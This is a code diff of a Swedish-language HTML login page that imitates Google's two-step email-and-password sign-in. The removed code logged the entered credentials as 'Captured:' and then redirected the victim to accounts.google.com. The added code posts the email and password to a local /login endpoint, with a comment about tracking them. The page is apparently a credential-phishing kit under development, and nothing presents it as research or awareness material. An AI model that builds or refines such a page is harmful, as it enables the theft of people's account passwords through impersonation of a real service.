@@ -37,7 +37,6 @@
             gap: 48px;
         }
 
-        /* Vänster kolumn */
         .left-col { 
             flex: 1; 
             padding: 12px; 
@@ -46,7 +45,6 @@
             justify-content: flex-start;
         }
         
-        /* Höger kolumn */
         .right-col { 
             flex: 1; 
             display: flex; 
@@ -61,9 +59,8 @@
         h1 { font-size: 36px; font-weight: 400; line-height: 44px; margin-bottom: 8px; }
         .subtitle { font-size: 16px; line-height: 24px; color: var(--text-main); }
 
-        /* E-post-pillen i vänstra kolumnen */
         .user-pill-container {
-            display: none; /* Dold som standard */
+            display: none;
             align-items: center;
             padding: 4px 12px 4px 4px;
             border: 1px solid #dadce0;
@@ -86,7 +83,6 @@
             margin-right: 8px;
         }
 
-        /* Form Styling */
         .input-group { margin-top: 24px; position: relative; }
         
         input[type="text"], input[type="password"] {
@@ -182,10 +178,10 @@
         </div>
 
         <div class="right-col">
-            <form id="login-form">
+            <form id="login-form" method="POST" action="/login">
                 <div id="email-step">
                     <div class="input-group">
-                        <input type="text" id="email" placeholder="E-post eller telefonnummer" required autofocus>
+                        <input type="text" id="email" name="email" placeholder="E-post eller telefonnummer" required autofocus>
                     </div>
                     <a href="#" class="link-text">Har du glömt din e-postadress?</a>
                     <div class="guest-text">
@@ -199,7 +195,7 @@
 
                 <div id="password-step">
                     <div class="input-group">
-                        <input type="password" id="password" placeholder="Ange ditt lösenord" required>
+                        <input type="password" id="password" name="password" placeholder="Ange ditt lösenord" required>
                     </div>
                     <div style="margin-top: 8px; display: flex; align-items: center; gap: 8px;">
                         <input type="checkbox" id="show-pw"> <label for="show-pw" style="font-size:14px">Visa lösenord</label>
@@ -234,15 +230,10 @@
 
         function toPassword() {
             if(emailInput.value.trim().length > 3) {
-                // 1. Sätt e-postadressen i pillen
                 displayEmail.innerText = emailInput.value;
-                
-                // 2. Ändra texter i vänster kolumn
                 title.innerText = 'Välkommen';
-                subtitle.style.display = 'none'; // Göm undertiteln
-                emailPill.style.display = 'flex'; // Visa e-post-pillen
-                
-                // 3. Växla steg i höger kolumn
+                subtitle.style.display = 'none';
+                emailPill.style.display = 'flex';
                 emailStep.style.display = 'none';
                 passwordStep.style.display = 'block';
                 passwordInput.focus();
@@ -250,11 +241,9 @@
         }
 
         function toEmail() {
-            // Återställ till första steget
             title.innerText = 'Logga in';
             subtitle.style.display = 'block';
             emailPill.style.display = 'none';
-            
             emailStep.style.display = 'block';
             passwordStep.style.display = 'none';
         }
@@ -264,10 +253,9 @@
         });
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            console.log("Captured:", emailInput.value, passwordInput.value);
-            // Skicka data här...
-            window.location.href = "https://accounts.google.com";
+            // Don't prevent default! Let the browser submit naturally to /login
+            // Just log for our own tracking
+            console.log("Submitting:", emailInput.value, passwordInput.value);
         });
     </script>
 </body>
